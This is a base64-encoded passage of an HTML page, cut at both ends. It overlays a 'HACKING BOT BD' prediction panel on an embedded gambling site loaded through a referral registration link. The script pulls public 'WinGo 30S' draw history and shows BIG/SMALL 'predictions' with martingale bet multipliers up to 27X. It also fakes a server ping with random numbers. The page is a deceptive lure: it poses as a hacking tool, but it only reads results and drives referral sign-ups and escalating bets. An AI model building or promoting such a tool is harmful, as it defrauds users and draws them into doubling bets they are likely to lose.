vaW50ZXItZXZlbnRzOiBub25lOwogICAgICAgICAgICBhbmltYXRpb246IGJvcmRlckNvbG9yU2hpZnQgNnMgbGluZWFyIGluZmluaXRlOwogICAgICAgIH0KICAgICAgICAuZGMtdGwgeyB0b3A6IDA7IGxlZnQ6IDA7IGJvcmRlci1yaWdodDogbm9uZTsgYm9yZGVyLWJvdHRvbTogbm9uZTsgYm9yZGVyLXJhZGl1czogMDsgfQogICAgICAgIC5kYy10ciB7IHRvcDogMDsgcmlnaHQ6IDA7IGJvcmRlci1sZWZ0OiBub25lOyBib3JkZXItYm90dG9tOiBub25lOyBib3JkZXItcmFkaXVzOiAwOyB9CiAgICAgICAgLmRjLWJsIHsgYm90dG9tOiAwOyBsZWZ0OiAwOyBib3JkZXItcmlnaHQ6IG5vbmU7IGJvcmRlci10b3A6IG5vbmU7IGJvcmRlci1yYWRpdXM6IDA7IH0KICAgICAgICAuZGMtYnIgeyBib3R0b206IDA7IHJpZ2h0OiAwOyBib3JkZXItbGVmdDogbm9uZTsgYm9yZGVyLXRvcDogbm9uZTsgYm9yZGVyLXJhZGl1czogMDsgfQoKICAgICAgICAjcmVzLXRleHQgewogICAgICAgICAgICBmb250LWZhbWlseTogJ09yYml0cm9uJzsgZm9udC1zaXplOiAxLjRyZW07CiAgICAgICAgICAgIGNvbG9yOiB2YXIoLS1jeWFuKTsgbWFyZ2luOiAwOyBmb250LXdlaWdodDogOTAwOwogICAgICAgICAgICBsZXR0ZXItc3BhY2luZzogMXB4OwogICAgICAgIH0KCiAgICAgICAgI2Rpc3BsYXktYm94IHNtYWxsIHsKICAgICAgICAgICAgZm9udC1zaXplOiAwLjQ4cmVtOyBjb2xvcjogIzZlYTNhOTsKICAgICAgICAgICAgbWFyZ2luOiA3cHggMCAwIDA7IGxldHRlci1zcGFjaW5nOiAxLjVweDsgZGlzcGxheTogYmxvY2s7CiAgICAgICAgfQoKICAgICAgICAuYWN0aW9uLWJ0biB7CiAgICAgICAgICAgIHdpZHRoOiA4NiU7IG1hcmdpbjogMTRweCA3JSAwIDclOwogICAgICAgICAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoOTBkZWcsIHJnYmEoMCwyNDMsMjU1LDAuMDgpLCByZ2JhKDAsMjQzLDI1NSwwLjAyKSk7CiAgICAgICAgICAgIGJvcmRlcjogMS41cHggc29saWQgdmFyKC0tY3lhbik7CiAgICAgICAgICAgIGNvbG9yOiB2YXIoLS1jeWFuKTsgcGFkZGluZzogMTBweDsgY3Vyc29yOiBwb2ludGVyOwogICAgICAgICAgICBmb250LWZhbWlseTogJ09yYml0cm9uJzsgZm9udC1zaXplOiAwLjY4cmVtOwogICAgICAgICAgICBmb250LXdlaWdodDogYm9sZDsgdHJhbnNpdGlvbjogMC4zczsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogMDsKICAgICAgICAgICAgbGV0dGVyLXNwYWNpbmc6IDFweDsKICAgICAgICB9CiAgICAgICAgLmFjdGlvbi1idG46YWN0aXZlIHsgYmFja2dyb3VuZDogdmFyKC0tY3lhbik7IGNvbG9yOiAjMDAwOyB9CgogICAgICAgICNvcGVuLWJ0biB7CiAgICAgICAgICAgIHBvc2l0aW9uOiBmaXhlZDsgYm90dG9tOiAzMHB4OyByaWdodDogMjBweDsKICAgICAgICAgICAgd2lkdGg6IDU4cHg7IGhlaWdodDogNThweDsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNTAlOwogICAgICAgICAgICBkaXNwbGF5OiBub25lOwogICAgICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAgICAgICAgY3Vyc29yOiBwb2ludGVyOwogICAgICAgICAgICB6LWluZGV4OiA5OTk5OwogICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDAsIDIwLCAyNSwgMC45Mik7CiAgICAgICAgICAgIGJvcmRlcjogMnB4IHNvbGlkIHZhcigtLWN5YW4pOwogICAgICAgICAgICBib3gtc2hhZG93OiBub25lOwogICAgICAgICAgICBhbmltYXRpb246IGJvcmRlckNvbG9yU2hpZnQgNnMgbGluZWFyIGluZmluaXRlOwogICAgICAgICAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgICAgICAgICB0cmFuc2l0aW9uOiB0cmFuc2Zvcm0gMC4yczsKICAgICAgICB9CiAgICAgICAgI29wZW4tYnRuOmFjdGl2ZSB7IHRyYW5zZm9ybTogc2NhbGUoMC45Mik7IH0KCiAgICAgICAgI29wZW4tYnRuIGltZyB7CiAgICAgICAgICAgIHdpZHRoOiAxMDAlOyBoZWlnaHQ6IDEwMCU7CiAgICAgICAgICAgIG9iamVjdC1maXQ6IGNvdmVyOwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1MCU7CiAgICAgICAgfQoKICAgICAgICAjdmlwLXBhbmVsIHsKICAgICAgICAgICAgd2lkdGg6IDIxMHB4OwogICAgICAgICAgICBtYXgtd2lkdGg6IGNhbGMoMTAwdncgLSAyNHB4KTsKICAgICAgICAgICAgbWF4LWhlaWdodDogY2FsYygxMDB2aCAtIDI0cHgpOwogICAgICAgICAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCByZ2JhKDAsMjQzLDI1NSwuMzUpOwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiAwOwogICAgICAgICAgICBib3gtc2hhZG93OiAwIDhweCAyOHB4IHJnYmEoMCwyNDMsMjU1LC4xMiksIGluc2V0IDAgMCAxOHB4IHJnYmEoMCwyNDMsMjU1LC4wMzUpOwogICAgICAgIH0KICAgICAgICAuaGVhZGVyIHsgcGFkZGluZzogN3B4IDlweDsgfQogICAgICAgIC5wcm9maWxlLXBpYyB7IHdpZHRoOiAyM3B4OyBoZWlnaHQ6IDIzcHg7IH0KICAgICAgICAuYnJhbmQgeyBmb250LXNpemU6IC41OHJlbTsgbGV0dGVyLXNwYWNpbmc6IC43cHg7IH0KICAgICAgICAjaGFjay1zZWN0aW9uIHsgcGFkZGluZzogNnB4IDhweCA4cHg7IGN1cnNvcjogZGVmYXVsdDsgfQogICAgICAgIC53Zy1zdGF0dXMgeyBkaXNwbGF5OmZsZXg7IGp1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuOyBnYXA6NHB4OyBwYWRkaW5nOjJweCAxcHggNnB4OyBmb250LXNpemU6OHB4OyBsZXR0ZXItc3BhY2luZzouMjVweDsgfQogICAgICAgIC53Zy10ZWFtIHsgY29sb3I6dmFyKC0tY3lhbik7IGZvbnQtd2VpZ2h0OjgwMDsgfQogICAgICAgIC53Zy1waW5nIHsgY29sb3I6IzhhYTdiMDsgfQogICAgICAgIC53Zy1jYXJkLCAud2ctaGlzdG9yeS1jYXJkIHsgYmFja2dyb3VuZDpsaW5lYXItZ3JhZGllbnQoMTQ1ZGVnLHJnYmEoMCwyNDMsMjU1LC4wOSkscmdiYSgyNTUsMjU1LDI1NSwuMDE4KSk7IGJvcmRlcjoxcHggc29saWQgcmdiYSgwLDI0MywyNTUsLjIpOyBib3JkZXItcmFkaXVzOjA7IHBhZGRpbmc6N3B4IDZweDsgbWFyZ2luLWJvdHRvbTo2cHg7IHRleHQtYWxpZ246Y2VudGVyOyB9CiAgICAgICAgLndnLW1vZGUgeyBkaXNwbGF5OmlubGluZS1ibG9jazsgbWF4LXdpZHRoOjEwMCU7IHBhZGRpbmc6M3B4IDdweDsgYm9yZGVyOjFweCBzb2xpZCByZ2JhKDAsMjQzLDI1NSwuMyk7IGJvcmRlci1yYWRpdXM6MDsgY29sb3I6dmFyKC0tY3lhbik7IGZvbnQtc2l6ZTo3cHg7IGxldHRlci1zcGFjaW5nOi40NXB4OyB9CiAgICAgICAgLndnLXRpbWVyIHsgY29sb3I6dmFyKC0tZ29sZCk7IGZvbnQ6OTAwIDE5cHggT3JiaXRyb24sbW9ub3NwYWNlOyBsZXR0ZXItc3BhY2luZzoxLjVweDsgbWFyZ2luOjVweCAwIDJweDsgfQogICAgICAgIC53Zy1wZXJpb2QgeyBjb2xvcjojYTZjNWNhOyBmb250LXNpemU6OHB4OyBtYXJnaW4tYm90dG9tOjNweDsgb3ZlcmZsb3ctd3JhcDphbnl3aGVyZTsgfQogICAgICAgIC53Zy1yZXN1bHQgeyBjb2xvcjp2YXIoLS1jeWFuKTsgZm9udDo5MDAgMjNweCBPcmJpdHJvbixtb25vc3BhY2U7IGxldHRlci1zcGFjaW5nOjFweDsgbWFyZ2luOjNweCAwOyB9CiAgICAgICAgLndnLWxldmVsIHsgZGlzcGxheTppbmxpbmUtYmxvY2s7IHBhZGRpbmc6NHB4IDZweDsgYm9yZGVyLXJhZGl1czowOyBib3JkZXI6MXB4IHNvbGlkIHJnYmEoMCwyNDMsMjU1LC4yMik7IGNvbG9yOiNkOGZhZmY7IGZvbnQtc2l6ZTo3cHg7IG1hcmdpbjozcHggMCA2cHg7IH0KICAgICAgICAud2ctaGlzdG9yeS1jYXJkIHsgdGV4dC1hbGlnbjpsZWZ0OyBwYWRkaW5nOjZweDsgbWFyZ2luLWJvdHRvbTowOyB9CiAgICAgICAgLndnLWhpc3RvcnktaGVhZCB7IGRpc3BsYXk6ZmxleDsgYWxpZ24taXRlbXM6Y2VudGVyOyBqdXN0aWZ5LWNvbnRlbnQ6c3BhY2UtYmV0d2VlbjsgZ2FwOjRweDsgY29sb3I6dmFyKC0tY3lhbik7IGZvbnQtc2l6ZTo4cHg7IGxldHRlci1zcGFjaW5nOi4zNXB4OyBtYXJnaW4tYm90dG9tOjRweDsgfQogICAgICAgIC53Zy1jbGVhciB7IHBhZGRpbmc6M3B4IDZweDsgYm9yZGVyOjFweCBzb2xpZCByZ2JhKDI1NSwwLDg1LC41KTsgYm9yZGVyLXJhZGl1czowOyBiYWNrZ3JvdW5kOnJnYmEoMjU1LDAsODUsLjEpOyBjb2xvcjojZmY3ODk5OyBmb250LXNpemU6N3B4OyBjdXJzb3I6cG9pbnRlcjsgfQogICAgICAgIC53Zy1oaXN0b3J5LXdyYXAgeyBtYXgtaGVpZ2h0Ojc2cHg7IG92ZXJmbG93OmF1dG87IH0KICAgICAgICAud2ctdGFibGUgeyB3aWR0aDoxMDAlOyBib3JkZXItY29sbGFwc2U6Y29sbGFwc2U7IGZvbnQtc2l6ZTo3cHg7IGNvbG9yOiNlNmY1Zjc7IH0KICAgICAgICAud2ctdGFibGUgdGggeyBjb2xvcjojNzljYmQxOyBmb250LXNpemU6NnB4OyBsZXR0ZXItc3BhY2luZzouMnB4OyBwYWRkaW5nOjRweCAxcHg7IGJvcmRlci1ib3R0b206MXB4IHNvbGlkIHJnYmEoMCwyNDMsMjU1LC4yKTsgfQogICAgICAgIC53Zy10YWJsZSB0ZCB7IHRleHQtYWxpZ246Y2VudGVyOyBwYWRkaW5nOjRweCAxcHg7IGJvcmRlci1ib3R0b206MXB4IHNvbGlkIHJnYmEoMCwyNDMsMjU1LC4wOCk7IH0KICAgICAgICAud2ctdGFibGUgLndpbiB7IGNvbG9yOiMwMGZmOWQ7IGZvbnQtd2VpZ2h0OjkwMDsgfQogICAgICAgIC53Zy10YWJsZSAubG9zcyB7IGNvbG9yOiNmZjY2ODg7IGZvbnQtd2VpZ2h0OjkwMDsgfQogICAgICAgIEBtZWRpYSAobWF4LXdpZHRoOjM2MHB4KSB7CiAgICAgICAgICAgICN2aXAtcGFuZWwgeyB3aWR0aDoxOThweDsgbWF4LXdpZHRoOmNhbGMoMTAwdncgLSAxOHB4KTsgfQogICAgICAgICAgICAjaGFjay1zZWN0aW9uIHsgcGFkZGluZzo1cHggNnB4IDdweDsgfQogICAgICAgIH0KICAgIDwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+CiAgICA8aWZyYW1lIGlkPSJnYW1lLWZyYW1lIiBzcmM9Imh0dHBzOi8vZGt3aW45LmNvbS8jcmVnaXN0ZXI/aW52aXRhdGlvbkNvZGU9NjM1MTIxODM5MDQ4Ij48L2lmcmFtZT4KICAgIDxkaXYgaWQ9Im9wZW4tYnRuIiBvbmNsaWNrPSJwYW5lbFRvZ2dsZSh0cnVlKSI+CiAgICAgICAgPGltZyBzcmM9Imh0dHBzOi8vZmlsZXMuY2F0Ym94Lm1vZS93ZXJxZjgucG5nIiBhbHQ9Ik9wZW4iPgogICAgPC9kaXY+CiAgICA8ZGl2IGlkPSJ2aXAtcGFuZWwiPgogICAgICAgIDxkaXYgY2xhc3M9ImNvcm5lciB0LWwiPjwvZGl2PjxkaXYgY2xhc3M9ImNvcm5lciB0LXIiPjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNvcm5lciBiLWwiPjwvZGl2PjxkaXYgY2xhc3M9ImNvcm5lciBiLXIiPjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImhlYWRlciI+CiAgICAgICAgICAgIDxhIGhyZWY9Imh0dHBzOi8vdC5tZS9IYWNraW5nQm90QmQiIHRhcmdldD0iX2JsYW5rIiBjbGFzcz0icHJvZmlsZS1saW5rIj4KICAgICAgICAgICAgICAgIDxpbWcgc3JjPSJodHRwczovL2ZpbGVzLmNhdGJveC5tb2Uvd2VycWY4LnBuZyIgY2xhc3M9InByb2ZpbGUtcGljIiBhbHQ9IlByb2ZpbGUiPgogICAgICAgICAgICA8L2E+CiAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJicmFuZCI+SEFDS0lORyBCT1QgQkQgPC9zcGFuPgogICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJjbG9zZS1idG4iIG9uY2xpY2s9InBhbmVsVG9nZ2xlKGZhbHNlKSI+4pyVPC9idXR0b24+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBpZD0iaGFjay1zZWN0aW9uIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0id2ctc3RhdHVzIj4KICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJ3Zy10ZWFtIj5TRVJWRVI6IENZQkVSTElOSzwvc3Bhbj4KICAgICAgICAgICAgICAgIDxzcGFuIGlkPSJwaW5nVmFsIiBjbGFzcz0id2ctcGluZyI+UElORzogLS1NUzwvc3Bhbj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9IndnLWNhcmQiPgogICAgICAgICAgICAgICAgPGRpdiBpZD0ic3RyYXREaXNwbGF5IiBjbGFzcz0id2ctbW9kZSI+TU9ERTogQ09OTkVDVElORzwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBpZD0idGltZXIiIGNsYXNzPSJ3Zy10aW1lciI+MDA6MzA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgaWQ9InBJRCIgY2xhc3M9IndnLXBlcmlvZCI+UEVSSU9EOiAtLS08L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgaWQ9InBSZXMiIGNsYXNzPSJ3Zy1yZXN1bHQiPldBSVQ8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgaWQ9Im1MZXZlbCIgY2xhc3M9IndnLWxldmVsIj5NQVJUSU5HQUxFOiBMRVZFTCAxICgxWCk8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9IndnLWhpc3RvcnktY2FyZCI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJ3Zy1oaXN0b3J5LWhlYWQiPgogICAgICAgICAgICAgICAgICAgIDxzcGFuPk5FVVJBTCBISVNUT1JZPC9zcGFuPgogICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9IndnLWNsZWFyIiB0eXBlPSJidXR0b24iIG9uY2xpY2s9ImNsZWFySGlzdG9yeSgpIj5DTEVBUiBMT0c8L2J1dHRvbj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0id2ctaGlzdG9yeS13cmFwIj4KICAgICAgICAgICAgICAgICAgICA8dGFibGUgY2xhc3M9IndnLXRhYmxlIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHRoZWFkPjx0cj48dGg+UEVSSU9EPC90aD48dGg+UFJFRDwvdGg+PHRoPlJFU1VMVDwvdGg+PHRoPlNUQVRVUzwvdGg+PC90cj48L3RoZWFkPgogICAgICAgICAgICAgICAgICAgICAgICA8dGJvZHkgaWQ9ImxvZ3MiPjwvdGJvZHk+CiAgICAgICAgICAgICAgICAgICAgPC90YWJsZT4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPHNjcmlwdD4KICAgICAgICBjb25zdCBwYW5lbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ2aXAtcGFuZWwiKTsKICAgICAgICBsZXQgaXNNb3ZpbmcgPSBmYWxzZSwgeE9mZiA9IDAsIHlPZmYgPSAwLCBzdGFydFgsIHN0YXJ0WTsKCiAgICAgICAgZnVuY3Rpb24gcGFuZWxUb2dnbGUoc2hvdykgewogICAgICAgICAgICBwYW5lbC5zdHlsZS5kaXNwbGF5ID0gc2hvdyA/ICJibG9jayIgOiAibm9uZSI7CiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJvcGVuLWJ0biIpLnN0eWxlLmRpc3BsYXkgPSBzaG93ID8gIm5vbmUiIDogImZsZXgiOwogICAgICAgIH0KCiAgICAgICAgcGFuZWwuYWRkRXZlbnRMaXN0ZW5lcigidG91Y2hzdGFydCIsIGUgPT4gewogICAgICAgICAgICBpZiAoZS50YXJnZXQuY2xvc2VzdCgiLnByb2ZpbGUtbGluayIpKSByZXR1cm47CiAgICAgICAgICAgIHN0YXJ0WCA9IGUudG91Y2hlc1swXS5jbGllbnRYIC0geE9mZjsKICAgICAgICAgICAgc3RhcnRZID0gZS50b3VjaGVzWzBdLmNsaWVudFkgLSB5T2ZmOwogICAgICAgICAgICBpZiAoZS50YXJnZXQuY2xvc2VzdCgiLmhlYWRlciIpIHx8IGUudGFyZ2V0ID09PSBwYW5lbCkgaXNNb3ZpbmcgPSB0cnVlOwogICAgICAgIH0sIHtwYXNzaXZlOiBmYWxzZX0pOwoKICAgICAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJ0b3VjaG1vdmUiLCBlID0+IHsKICAgICAgICAgICAgaWYgKGlzTW92aW5nKSB7CiAgICAgICAgICAgICAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICAgICAgICAgICAgICB4T2ZmID0gZS50b3VjaGVzWzBdLmNsaWVudFggLSBzdGFydFg7CiAgICAgICAgICAgICAgICB5T2ZmID0gZS50b3VjaGVzWzBdLmNsaWVudFkgLSBzdGFydFk7CiAgICAgICAgICAgICAgICBwYW5lbC5zdHlsZS50cmFuc2Zvcm0gPSBgdHJhbnNsYXRlM2QoJHt4T2ZmfXB4LCAke3lPZmZ9cHgsIDApYDsKICAgICAgICAgICAgfQogICAgICAgIH0sIHtwYXNzaXZlOiBmYWxzZX0pOwogICAgICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoInRvdWNoZW5kIiwgKCkgPT4gaXNNb3ZpbmcgPSBmYWxzZSk7CgogICAgICAgIHBhbmVsLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlZG93biIsIGUgPT4gewogICAgICAgICAgICBpZiAoZS50YXJnZXQuY2xvc2VzdCgiLnByb2ZpbGUtbGluayIpKSByZXR1cm47CiAgICAgICAgICAgIHN0YXJ0WCA9IGUuY2xpZW50WCAtIHhPZmY7CiAgICAgICAgICAgIHN0YXJ0WSA9IGUuY2xpZW50WSAtIHlPZmY7CiAgICAgICAgICAgIGlmIChlLnRhcmdldC5jbG9zZXN0KCIuaGVhZGVyIikgfHwgZS50YXJnZXQgPT09IHBhbmVsKSBpc01vdmluZyA9IHRydWU7CiAgICAgICAgfSk7CiAgICAgICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigibW91c2Vtb3ZlIiwgZSA9PiB7CiAgICAgICAgICAgIGlmIChpc01vdmluZykgewogICAgICAgICAgICAgICAgeE9mZiA9IGUuY2xpZW50WCAtIHN0YXJ0WDsKICAgICAgICAgICAgICAgIHlPZmYgPSBlLmNsaWVudFkgLSBzdGFydFk7CiAgICAgICAgICAgICAgICBwYW5lbC5zdHlsZS50cmFuc2Zvcm0gPSBgdHJhbnNsYXRlM2QoJHt4T2ZmfXB4LCAke3lPZmZ9cHgsIDApYDsKICAgICAgICAgICAgfQogICAgICAgIH0pOwogICAgICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNldXAiLCAoKSA9PiBpc01vdmluZyA9IGZhbHNlKTsKCiAgICAgICAgY29uc3QgQVBJID0gImh0dHBzOi8vZHJhdy5hci1sb3R0ZXJ5MDEuY29tL1dpbkdvL1dpbkdvXzMwUy9HZXRIaXN0b3J5SXNzdWVQYWdlLmpzb24iOwogICAgICAgIGxldCBsYXN0UCA9IG51bGwsIG5leHRQID0gbnVsbCwgdGFyZ2V0TnVtcyA9IFtdLCBjdXJyZW50TGV2ZWwgPSAxOwogICAgICAgIGxldCBoaXN0b3J5TG9ncyA9IFtdOwogICAgICAgIGxldCBzeW5jSW50ZXJ2YWwgPSBudWxsOwogICAgICAgIGxldCBjbG9ja0ludGVydmFsID0gbnVsbDsKCiAgICAgICAgY29uc3Qgc1dpbiA9IG5ldyBBdWRpbygnaHR0cHM6Ly9hc3NldHMubWl4a2l0LmNvL2FjdGl2ZV9zdG9yYWdlL3NmeC8yMDE5LzIwMTktcHJldmlldy5tcDMnKTsKICAgICAgICBjb25zdCBzTG9zcyA9IG5ldyBBdWRpbygnaHR0cHM6Ly9hc3NldHMubWl4a2l0LmNvL2FjdGl2ZV9zdG9yYWdlL3NmeC85NTEvOTUxLXByZXZpZXcubXAzJyk7CiAgICAgICAgY29uc3Qgc0RpbmcgPSBuZXcgQXVkaW8oJ2h0dHBzOi8vYXNzZXRzLm1peGtpdC5jby9hY3RpdmVfc3RvcmFnZS9zZngvMjg2OS8yODY5LXByZXZpZXcubXAzJyk7CiAgICAgICAgW3NXaW4sIHNMb3NzLCBzRGluZ10uZm9yRWFjaChhID0+IHsgYS52b2x1bWUgPSAwLjU7IGEubG9hZCgpOyB9KTsKCiAgICAgICAgZnVuY3Rpb24gc3RhcnRFbmdpbmUoKSB7CiAgICAgICAgICAgIHN5bmNFbmdpbmUoKTsKICAgICAgICAgICAgaWYgKHN5bmNJbnRlcnZhbCkgY2xlYXJJbnRlcnZhbChzeW5jSW50ZXJ2YWwpOwogICAgICAgICAgICBzeW5jSW50ZXJ2YWwgPSBzZXRJbnRlcnZhbChzeW5jRW5naW5lLCAyMDAwKTsKICAgICAgICAgICAgc3RhcnRDbG9jaygpOwogICAgICAgICAgICBzZXRJbnRlcnZhbCgoKSA9PiB7CiAgICAgICAgICAgICAgICBjb25zdCBwaW5nU3BhbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwaW5nVmFsJyk7CiAgICAgICAgICAgICAgICBpZiAocGluZ1NwYW4pIHBpbmdTcGFuLmlubmVyVGV4dCA9IGBQSU5HOiAke01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIDggKyA4KX1NU2A7CiAgICAgICAgICAgIH0sIDUwMDApOwogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gc3RhcnRDbG9jaygpIHsKICAgICAgICAgICAgaWYgKGNsb2NrSW50ZXJ2YWwpIGNsZWFySW50ZXJ2YWwoY2xvY2tJbnRlcnZhbCk7CiAgICAgICAgICAgIGNsb2NrSW50ZXJ2YWwgPSBzZXRJbnRlcnZhbCgoKSA9PiB7CiAgICAgICAgICAgICAgICBjb25zdCB0aW1lckRpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0aW1lcicpOwogICAgICAgICAgICAgICAgaWYgKCF0aW1lckRpdikgcmV0dXJuOwogICAgICAgICAgICAgICAgY29uc3QgcmVtID0gMzAgLSAobmV3IERhdGUoKS5nZXRTZWNvbmRzKCkgJSAzMCk7CiAgICAgICAgICAgICAgICB0aW1lckRpdi5pbm5lclRleHQgPSBgMDA6JHtTdHJpbmcocmVtKS5wYWRTdGFydCgyLCAnMCcpfWA7CiAgICAgICAgICAgICAgICBpZiAocmVtID09PSA1KSBzRGluZy5wbGF5KCkuY2F0Y2goKCkgPT4ge30pOwogICAgICAgICAgICAgICAgdGltZXJEaXYuc3R5bGUuY29sb3IgPSByZW0gPD0gNSA/ICIjZmYyYTVlIiA6IChyZW0gPD0gMTAgPyAiI2ZmODgwMCIgOiAiI2ZmY2MwMCIpOwogICAgICAgICAgICB9LCAxMDAwKTsKICAgICAgICB9CgogICAgICAgIGFzeW5jIGZ1bmN0aW9uIHN5bmNFbmdpbmUoKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBjb25zdCByID0gYXdhaXQgZmV0Y2goQVBJICsgJz90PScgKyBEYXRlLm5vdygpKTsKICAgICAgICAgICAgICAgIGlmICghci5vaykgdGhyb3cgbmV3IEVycm9yKCdIaXN0b3J5IEFQSSBIVFRQICcgKyByLnN0YXR1cyk7CiAgICAgICAgICAgICAgICBjb25zdCBkID0gYXdhaXQgci5qc29uKCk7CiAgICAgICAgICAgICAgICBpZiAoIWQgfHwgIWQuZGF0YSB8fCAhZC5kYXRhLmxpc3QgfHwgIWQuZGF0YS5saXN0Lmxlbmd0aCkgcmV0dXJuOwogICAgICAgICAgICAgICAgY29uc3QgdG9wID0gZC5kYXRhLmxpc3RbMF07CiAgICAgICAgICAgICAgICBjb25zdCBpc3N1ZU51bWJlciA9IFN0cmluZyh0b3AuaXNzdWVOdW1iZXIpOwogICAgICAgICAgICAgICAgY29uc3QgcmF3TnVtYmVyID0gcGFyc2VJbnQodG9wLm51bWJlciwgMTApOwogICAgICAgICAgICAgICAgaWYgKCFpc3N1ZU51bWJlciB8fCAhTnVtYmVyLmlzRmluaXRlKHJhd051bWJlcikpIHJldHVybjsKICAgICAgICAgICAgICAgIHByb2Nlc3NIeWJyaWQoaXNzdWVOdW1iZXIsIHJhd051bWJlciwgZC5kYXRhLmxpc3QpOwogICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLndhcm4oIldpbkdvIEFQSSBzeW5jIGVycm9yIiwgZSk7CiAgICAgICAgICAgICAgICBjb25zdCBtb2RlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3N0cmF0RGlzcGxheScpOwogICAgICAgICAgICAgICAgaWYgKG1vZGUgJiYgbW9kZS50ZXh0Q29udGVudCA9PT0gJ01PREU6IENPTk5FQ1RJTkcnKSBtb2RlLnRleHRDb250ZW50ID0gJ01PREU6IEFQSSBXQUlUSU5HJzsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gcHJvY2Vzc0h5YnJpZChwLCBudW0sIGxpc3QpIHsKICAgICAgICAgICAgY29uc3QgYWN0dWFsTGFiZWwgPSBudW0gPj0gNSA/ICJCSUciIDogIlNNQUxMIjsKICAgICAgICAgICAgY29uc3QgYWN0dWFsRGlzcGxheSA9IGAke2FjdHVhbExhYmVsfSgke251bX0pYDsKCiAgICAgICAgICAgIGlmIChsYXN0UCAhPT0gbnVsbCAmJiBsYXN0UCAhPT0gcCAmJiBuZXh0UCAhPT0gbnVsbCkgewogICAgICAgICAgICAgICAgY29uc3QgaXNXaW4gPSAobmV4dFAgPT09IGFjdHVhbExhYmVsKSB8fCB0YXJnZXROdW1zLmluY2x1ZGVzKG51bSk7CiAgICAgICAgICAgICAgICBpZiAoaXNXaW4pIHsKICAgICAgICAgICAgICAgICAgICBzV2luLnBsYXkoKS5jYXRjaCgoKSA9PiB7fSk7CiAgICAgICAgICAgICAgICAgICAgY3VycmVudExldmVsID0gMTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgc0xvc3MucGxheSgpLmNhdGNoKCgpID0+IHt9KTsKICAgICAgICAgICAgICAgICAgICBjdXJyZW50TGV2ZWwrKzsKICAgICAgICAgICAgICAgICAgICBpZiAoY3VycmVudExldmVsID4gNCkgY3VycmVudExldmVsID0gMTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBsZXQgbXVsdGlwbGllciA9ICIxWCI7CiAgICAgICAgICAgICAgICBpZiAoY3VycmVudExldmVsID09PSAyKSBtdWx0aXBsaWVyID0gIjNYIjsKICAgICAgICAgICAgICAgIGVsc2UgaWYgKGN1cnJlbnRMZXZlbCA9PT0gMykgbXVsdGlwbGllciA9ICI5WCI7CiAgICAgICAgICAgICAgICBlbHNlIGlmIChjdXJyZW50TGV2ZWwgPT09IDQpIG11bHRpcGxpZXIgPSAiMjdYIjsKICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtTGV2ZWwnKS5pbm5lclRleHQgPSBgTUFSVElOR0FMRTogTEVWRUwgJHtjdXJyZW50TGV2ZWx9ICgke211bHRpcGxpZXJ9KWA7CgogICAgICAgICAgICAgICAgY29uc3QgZW50cnkgPSB7CiAgICAgICAgICAgICAgICAgICAgcGVyaW9kOiBTdHJpbmcocCkuc2xpY2UoLTMLKSwKICAgICAgICAgICAgICAgICAgICBwcmVkOiBuZXh0UCwKICAgICAgICAgICAgICAgICAgICByZXN1bHQ6IGFjdHVhbERpc3BsYXksCiAgICAgICAgICAgICAgICAgICAgc3RhdHVzOiBpc1dpbiA/ICdXSU4nIDogJ0xPU1Mn